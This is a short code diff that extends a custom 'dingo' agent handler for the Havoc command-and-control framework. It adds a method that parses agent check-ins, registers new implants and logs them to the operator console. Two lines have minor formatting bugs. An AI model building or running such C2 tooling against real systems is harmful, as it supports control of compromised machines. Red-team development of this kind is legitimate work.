@@ -4,7 +4,7 @@ from havoc.agent import *
 class CommandExit(Command):
     Name = "exit"
     Description = "tells agent to exit"
-    Help = "lol no"
+    Help = "leave the shell"
     NeedAdmin = False
     Mitr = []
     Params = []
@@ -54,6 +54,23 @@ class dingo(AgentType):
 
     def generate(self, config: dict) -> None:
         self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Config: {config['Config']}" )
+    
+    def response(self, response: dict) -> bytes:
+        agentHeader = response[ "AgentHeader" ]
+        agentResponse = response[ "Response" ]
+        
+        print("received response from agent (%s)\n---\nResponse:\n%s", agentHeader, agentResponse)
+        
+        agentJSONResponse = json.loads(agentResponse)
+        if agentJSONResponse["task"] == "register":
+            print("[+] Registered Agent")
+            self.register(agentHeader, json.loads(agentJSONResponse["data"]))
+            
+            AgentID = response["AgentHeader"]["AgentID"]
+            
+            self.console_message(AgentID, "Good", "Dingo Agent {AgentID} successfully registered", "")
+            return b'registered'
+        
 
 def main():
     Havoc_Dingo = dingo()
